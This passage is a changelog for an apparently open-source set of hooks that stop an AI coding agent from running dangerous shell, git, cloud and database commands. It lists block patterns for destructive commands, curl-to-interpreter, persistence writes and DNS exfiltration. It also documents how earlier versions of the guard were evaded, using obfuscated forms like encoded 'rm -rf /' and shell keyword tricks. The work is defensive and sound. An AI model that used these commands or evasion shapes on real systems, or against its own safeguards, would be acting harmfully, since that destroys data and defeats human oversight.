  commentary ("refused regardless of flag ordering...") have been replaced
  with a concrete next-step path (run in a controlled terminal, edit via
  the Edit tool, review the plan output, etc.). The `_format_deny_reason`
  footer still appends the override path, so the body is now consistently
  threat-shape + alternative.

### Test coverage

- Direct regression tests added for previously-untested defensive paths:
  `open_safe`'s `O_NOFOLLOW` symlink refusal (security-sensitive TOCTOU
  guard); `_read_message_file`'s `ValueError`/`OSError` fallback;
  `credential_check._expand`'s `OSError` fallback;
  `git_c_validator._decide_stash`'s unknown-action fallthrough;
  `agent_output_guard.hook`'s non-dict `tool_input` passthrough;
  `allowlist._validate_allow_commands`'s non-list warning branch.

### Packaging

- CI + release smoke matrices now include Python 3.12 alongside 3.11
  and 3.13, matching the `Programming Language :: Python :: 3.12`
  classifier in `pyproject.toml`.

### Docs

- README hook table rows for `commit_message_validator`,
  `agent_output_guard`, and `subagent_scope` now describe the
  actual matchers (path-based, not size-based; file-edit scope,
  not Task dispatch). Added `GUARD_PROTECTED_EXTRA` to the env
  var table.
- SKILL.md: `subagent_scope` description fixed to match
  implementation; `--scope project|global` flag references replaced
  with the actual `--global` / `--project` boolean pair; allowlist
  CLI examples use the real `--rule` / `--command` / `--reason`
  flag form; `GUARD_PROTECTED_EXTRA` file/env precedence wording
  matches `protected_files._extra_patterns` (file replaces env,
  not merges).
- README "CLI never writes" claim narrowed — query subcommands
  (`status`, `noisy`, `silent`, `trace`, `diff`, `test`) are
  read-only, but `guard allowlist *` mutations write to the
  allowlist file.

## [1.0.0] - 2026-05-09

### Added — allowlist (per-rule disable + per-command override)

- Per-rule `disable_rules` and per-command `allow_commands` mechanisms
  let users silence individual rules or specific commands without
  forking the plugin. Project-scoped (`.claude/guard/allowlist.json`)
  and global (`~/.claude/guard/allowlist.json`) allowlists merge with
  project precedence. CLI: `guard allowlist {list,rules,disable-rule,
  enable-rule,allow-command,remove-command}` with `--global` /
  `--project` flags. Every bypass is logged as a `decision="pass"`
  audit record. See `SKILL.md`.
- `protected_files` trust-root: writes to `.claude/guard/allowlist.json`
  and `.claude/settings*.json` are NOT allowlist-bypassable — those
  files control whether guard runs at all and whether allowlist
  overrides apply, so they always go through ASK.

### Changed — deny-string template (rule_id + override path)

- `bash_command_validator`: every allowlist-routed deny (always-deny,
  synthetic-deny, credential-leak) now ends with `Rule: <rule_id>.
  Override: \`guard allowlist allow-command <rule_id> '<command>'
  --reason '...'\` or \`guard allowlist disable-rule <rule_id>\`.` —
  users hit by a false positive can act without grepping the source.
  Helper `_format_deny_reason` keeps the footer identical across
  matchers so the shape is learnable. Pre-deny shapes (pipe-to-shell,
  dangerous-construct, conditional-safe denied flag) keep their
  existing reasons — they are not allowlist-routed.

### Hardened — bash canonicalization

- `bash_command_validator`: ANSI-C `$'\NNN'` octal escapes now decoded
  before per-form matchers (`$'\162\155' -rf /` no longer slips past
  the `rm` deny). `{x..x}` single-element brace-range expansion is
  identity-expanded so `{r..r}m -rf /` and `{g..g}it push
  --force-with-lease` are detected (multi-element ranges still
  refused — they're a DoS surface, not a real bypass class).

### Hardened — extractor coverage + safe-IO

- `protected_files`: `find -fprint`/`-fprintf`/`-fls`/`-fprint0` write
  targets now extracted; `nvim --headless` recognised as batch mode
  (was bypass); macOS APFS / Windows NTFS case-insensitive matching so
  `.Claude/CLAUDE.md` no longer evades `is_protected`.
- `protected_files`: trust-root patterns
  (`.claude/guard/allowlist.json`, `.claude/settings*.json`) are NOT
  allowlist-bypassable.
- `protected_files`: `.claude/guard-protected.txt` now read via shared
  safe-IO (cwd-scope, O_NOFOLLOW, 64 KiB cap, 256-pattern cap, corrupt
  UTF-8 → no extras).
- `protected_files`: interpreter eval-body scan raised to 1 MiB and
  emits a forced-ASK sentinel on overflow — no silent truncation.
- `_safe_io`: sensitive-read denylist gains `/var/run/secrets/`,
  `/var/lib/kubelet/`, `~/.bash_history`, `~/.zsh_history`, `~/.npmrc`,
  `~/.pypirc`, `~/.config/sops/`.

### Changed — shared safe-IO primitives

- New `guard._safe_io` module consolidates the cwd/temp scope check,
  sensitive-target denylist, stream-shape detection, and `O_NOFOLLOW`
  + size-cap read into one audited surface. `commit_message_validator`
  and `protected_files` (`patch -i <diff>` reader) now share the same
  primitives. Diff reads bounded to 256 KiB; interpreter eval-body
  substring scan bounded to 32 KiB.

### Added — protected_files project-local extension

- `GUARD_PROTECTED_EXTRA` env var (comma-separated) and
  `.claude/guard-protected.txt` project file (one pattern per line,
  `#` for comments) extend `PROTECTED_PATTERNS` without forking. File
  wins over env. See `SKILL.md`.

### Added — protected_files extractor coverage

- `ex -sc <cmd> <target>` and `vim -es -c <cmd> <target>` /
  `vim -es +<cmd> <target>` batch-mode editors now extract the trailing
  positional as a write target. Bare interactive `vim <file>` is NOT
  flagged.
- `patch -i <diff>` and `patch < <diff>` (stdin redirect) now read the
  diff body and extract `--- a/<path>` / `+++ b/<path>` headers as
  candidate targets. `--- /dev/null` (added-file marker) is ignored.
- `find <root> -exec <cmd> ... \;` emits `<root>` as a candidate so a
  recursive search rooted in a protected directory gets ASK'd.
- Per-interpreter eval-flag map: `python|python3 -c`, `node|deno|bun
  -c|-e|--eval`, `perl|ruby -e`, `php -r`. The body of the eval string
  is scanned for literal protected-pattern substrings; matches surface
  the protected path. Versioned basenames (`python3.11`) handled.

### Added — orchestration destruction coverage

- `bash_command_validator`: ~30 new synthetic-deny matchers covering
  - **Cloud destruction**: `aws iam/ec2/rds/lambda/dynamodb/eks/ecr/ecs/kms/secretsmanager/ssm/s3` destructive verbs;
    `gcloud projects/iam/secrets/sql/run/storage delete`; `az group/aks/vm/storage/keyvault/sql delete`.
  - **DB CLIs**: `psql/mysql/mariadb/cqlsh/sqlite3 -c "DROP|DELETE FROM|TRUNCATE|ALTER|GRANT|REVOKE"`;
    `sqlite3 <db> "<destructive SQL>"` (no -c form); `redis-cli FLUSHALL/FLUSHDB/CONFIG/SAVE/SHUTDOWN`;
    `dropdb`, `mysqladmin drop`; `mongo --eval` with destructive ops.
  - **Disk / FS / network destruction**: `mkfs`, `dd of=/dev/...`, `shred /dev/...`, `parted/fdisk/wipefs`,
    `diskutil eraseDisk`; `iptables -F`, `nft flush ruleset`, `ufw reset`.
  - **Persistence + privilege escalation**: writes to `~/.bashrc`, `~/.ssh/authorized_keys`, `/etc/sudoers`,
    `/etc/profile.d/*`, `/etc/cron.d/*`, `~/Library/LaunchAgents/*`, `/etc/systemd/system/*`,
    PATH-hijack writes to `/usr/local/bin/`; `crontab -e/-r`, `at`, `systemctl enable/start/link/mask`,
    `launchctl load`, `visudo`; chmod setuid/setgid; chmod against sensitive targets;
    `sudo -i/-s/su`; `insmod/modprobe`; `gdb -p`/`strace -p`/`ptrace`.
  - **IaC destruction**: `terraform apply -destroy`, `pulumi destroy`, `cdk destroy`,
    `helm uninstall`, `vault {kv,secrets,token,policy} {delete,destroy,revoke}`, `argocd app delete`.
  - **Remote-package install**: `npm/yarn/pnpm/bun install <URL|git+|github:|local>`;
    `npx/pnpx/bunx <pkg>`; `cargo install --git/--path/--registry`;
    `go install/run/get <pkg-with-@version>`; `gem install --source <url>`;
    `helm install <URL>`; `helm repo add <URL>`.
  - **Pipeline-to-interpreter**: `curl evil | python|ruby|perl|php|lua|bun|deno`.
  - **Encoding evasion**: `trap '<cmd>' EXIT`, `env -S '<cmd>'`, `function-def + invoke`,
    glob in command head, `stdbuf/watch/flock/chrt/taskset/runuser/chroot/unshare/firejail` wrappers
    around dangerous payloads.
  - **Remote-shell wrappers**: `ssh host '<cmd>'`, `docker/podman/lxc/kubectl exec`, `nsenter`.
  - **DNS exfil heuristic**: `ping/dig/host/nslookup` with DNS labels >50 chars.
  - **Git history destruction**: `git filter-branch`, `git filter-repo`,
    `git reflog expire/delete`, `git gc --prune=now`,
    `git push --force-with-lease`, `--force-if-includes`, `--mirror`, `+<refspec>`.
  - **Git submodule/worktree path scoping**: `git submodule add <url>` denied;
    `git worktree add` denied only when target resolves under a system root.
- `git_c_validator`: detects fused `-c<key>=val` (no-space), `-c=key=val`,
  and `--config-env=key=ENV` forms — closes the bypass where the previous
  parser only handled `-c key=val` (separate tokens).
- `commit_message_validator`: refuses `git commit -F <path>` when the path
  resolves outside cwd or under sensitive system roots (/etc, /proc,
  ~/.ssh, ~/.aws, ~/.gnupg). Opens the resolved file with `O_NOFOLLOW`
  to close the symlink-TOCTOU window. Prevents `-F /etc/passwd`
  content-disclosure into commit body.
- `protected_files`: adds `.git/hooks`, `.git/config`, `.git/info/attributes`,
  `.git/info/exclude`, `.gitmodules`, `.gitattributes`. Directory-pattern
  matching scoped to patterns whose last segment has no `.`.
- Registry: `GIT_CONFIG_EXEC_SINKS` extended with `core.attributesfile`,
  `color.pager`, `uploadpack.packobjectshook`, `protocol.allow`,
  `receive.procreceiverefs`. Glob patterns extended with `pager.*` and
  `protocol.*.allow`.
- Test surface: 500+ parametrized cases in
  `tests/integration/test_synth_matchers_coverage.py` exercising every
  matcher family with paired DENY / LEGIT cases.

### Fixed (review pass 4)

Pass-4 surfaced verified bypasses across three classes; all closed below.

**Shell-semantics bypasses (`bash_command_validator`):**

- ANSI-C `$'...'` quoting (Bash Reference Manual §3.1.2.4) is decoded at
  the canonicalization layer. Without this, a head spelled
  `$'\x64\x72\x6f\x70\x64\x62'` (= `dropdb`) reached every per-form
  matcher as the literal escape string and bypassed head-token checks.
- Bash brace expansion (`{r,r}m -rf /`, `tee /etc/{sudoers.d/x,profile.d/x.sh}`)
  is expanded line-by-line. Newlines preserved so pipeline-split keeps
  per-line segmentation.
- Shell control-flow keywords (`then`, `else`, `elif`, `do`, `in`, `;;`,
  `if`, `while`, `until`, `for`, `case`) are stripped from segment heads
  after pipeline-split. Before this, `if true; then rm -rf /; fi` and
  `for i in 1; do rm -rf /; done` produced segments whose heads were
  `then`/`do` and missed every matcher. Bare `fi`/`done`/`esac`
  terminators are dropped.

**Cloud-CLI matchers (`bash_command_validator`):**

- `aws`/`gcloud`/`az` now walk past leading global flags before indexing
  into the destructive-path tuple. Pass-3 closed the same defect for
  `git -c`; the cloud matchers retained the rigid `tokens[1]/[2]` shape.
  Bypassed shapes now denied: `aws --region X ec2 terminate-instances`,
  `aws --profile prod iam delete-user`, `gcloud --format json projects
  delete`, `gcloud --quiet projects delete`, `az --subscription X group
  delete`, `az -o json keyvault delete`.

**Per-matcher coverage extensions:**

- `vault` matcher now covers `token revoke`/`revoke-self`/`revoke-orphan`,
  `secrets disable`, `policy delete`, `auth disable`, `lease revoke`/
  `revoke-prefix` (was: only `kv destroy`/`metadata delete`).
- `mongosh` now denies `-e <body>` (short alias of `--eval`) and
  `--file <path>`/`-f <path>`/`--file=<path>` — file body is opaque so the
  matcher refuses rather than allowing blindly.
- Disk-destruction matchers (`mkfs.*`, `dd of=`, `shred`, `parted`,
  `wipefs`) now treat filesystem-image paths (`.img`, `.iso`, `.qcow2`,
  `.vhd[x]`, `.vmdk`, `.raw`, `.dd`) as device-equivalents. Formatting an
  image and booting it is the same threat shape as targeting `/dev/`.

**Audit-log hardening (`_utils.py`):**

- `log_decision` now applies a focused secret-redaction pass to both
  `command_excerpt` and `reason` before persistence. 18 vendor-specific
  shapes covered (AWS access-key IDs, Anthropic / OpenAI / generic
  `sk-*` keys, GitHub PAT/OAuth/server tokens, GitLab PAT, Slack tokens,
  Stripe keys, SendGrid, npm, PyPI macaroons, JWT bearer, PEM private
  keys, `Authorization: Bearer …` headers, `KEY=value` for credential-named
  keys). Without this the JSONL log was a side-channel exfiltration
  target — any process able to read it harvested every secret the agent
  typed, indexed by hook and timestamp.
- `append_jsonl` now opens the log path with `O_NOFOLLOW | O_CLOEXEC`
  and creates the parent directory at mode `0o700`. Prevents a
  pre-planted symlink at `~/.claude/guard-decisions.jsonl` from turning
  guard's append into an arbitrary-write primitive against
  attacker-chosen targets (e.g. `/etc/cron.d/x`).

### Fixed (review pass 3)

- `_is_git_worktree_add` now consumes value-flags (`-b`, `-B`, `--reason`,
  `--track`) as flag+value pairs before locating the path positional. Pass-2
  flag-skip logic was naive: `git worktree add -b exploit /etc/systemd/system
  HEAD` skipped `-b` then matched `exploit` (the branch name) as the path,
  cleared it, and bypassed the deny on `/etc/systemd/system`.

### Fixed (review pass 2)

- `_is_git_worktree_add` no longer denies `git worktree add /Users/...` /
  `/home/...` — pass-1 reused `_DANGEROUS_PATH_PREFIXES` which includes user
  home roots, breaking the canonical worktree shape on macOS/Linux. New
  `_WORKTREE_DANGEROUS_PREFIXES` excludes `/Users/`, `/home/`, `/private/`.
- `_is_chmod_sensitive_target` no longer denies hardening commands like
  `chmod 600 ~/.ssh/id_rsa`. Now: any chmod against system roots
  (`/etc/sudoers`) denies; chmod against home subset (`~/.ssh`, `~/.aws`,
  `~/.gnupg`) denies only when the mode grants group/other access.
- New `_SYNTH_CHMOD_SENSITIVE_TARGET_DENY` label so the audit-log reason
  no longer claims "setuid/setgid bit" when the trigger was a permissive
  mode against a sensitive path.
- CI smoke jobs (`install-smoke`, `testpypi-smoke`) now install
  `pytest-xdist` so the suite-wide `addopts = -n auto --dist loadfile`
  doesn't fail with `unrecognized arguments`.

### Fixed (review pass)

- `_match_always_deny_literal` recognises `prefix=value` form
  (`git push --force-with-lease=ref` was bypassing the literal DENY).
- `git push +HEAD:main` (3-token, no remote) now denied (was missing the
  refspec-force matcher).
- `bun run /tmp/x.js` / `bun test ./script.ts` denied (was exempted as
  package subcommand; now distinguishes script-name from script-path).
- `chmod 666 /etc/sudoers` denied (was passing because `_is_chmod_dangerous`
  required recursive AND 777).
- `docker exec --help <container> rm -rf /` denied (the `--help`
  short-circuit was positional-blind; now requires `--help` to stand alone).
- `_is_pipe_to_interpreter` wired into the dispatcher (was orphan).

### Foundational hooks (initial 1.0 surface)

Guard ships seven stdlib-only `PreToolUse` hooks that sit between Claude
Code and the tool surface, denying high-risk actions before they reach
the host. The hook contract, decision-log schema, and autonomous-mode
behavior are stable for the 1.x line.

- `bash_command_validator` — denies dangerous shell shapes (rm -rf,
  fork bombs, curl|sh, interpreter `-c` eval, runner-prefix bypasses).
- `git_c_validator` — blocks `git -c <key>=<val>` injection of executable
  config keys (alias.\*, core.pager, core.editor, filter.\*).
- `credential_check` — scans tool inputs for API keys, tokens, private
  keys, and provider-specific secret shapes before they leave the agent.
- `commit_message_validator` — rejects commit messages that leak
  AI-tool attribution markers (Co-Authored-By footers, generated-with
  notices, named tool branding).
- `agent_output_guard` — denies direct reads of dispatched-subagent
  output transcripts so context is preserved for the orchestrator.
- `protected_files` — forces an ASK confirmation on edits to guard's
  own validator files and to the Claude Code settings files that
  govern hook activation.
- `subagent_scope` — restricts what a dispatched subagent can read or
  modify based on a per-task allowlist.
- JSONL decision log (schema v1) at `~/.claude/guard-decisions.jsonl`
  for after-the-fact audit of every allow/deny.
- Autonomous-mode strict default-deny: when `CLAUDE_AUTONOMOUS=1` is set
  the hooks switch to fail-closed semantics for ambiguous inputs.

### Security

- Defense-in-depth posture: each hook is independent, and a deny from
  any hook short-circuits the tool call. See [SECURITY.md](SECURITY.md)
  for the threat model and reporting policy.
- Mitigates the class of agent-confusion bypasses tracked under
  CVE-2025-59356 by validating the literal command shape rather than
  trusting model-emitted intent.

[1.3.1]: https://github.com/TracineHQ/guard/compare/v1.3.0...v1.3.1
[1.3.0]: https://github.com/TracineHQ/guard/compare/v1.2.0...v1.3.0
[1.2.0]: https://github.com/TracineHQ/guard/compare/v1.1.1...v1.2.0
[1.1.1]: https://github.com/TracineHQ/guard/compare/v1.1.0...v1.1.1
[1.1.0]: https://github.com/TracineHQ/guard/compare/v1.0.0...v1.1.0
[1.0.0]: https://github.com/TracineHQ/guard/releases/tag/v1.0.0
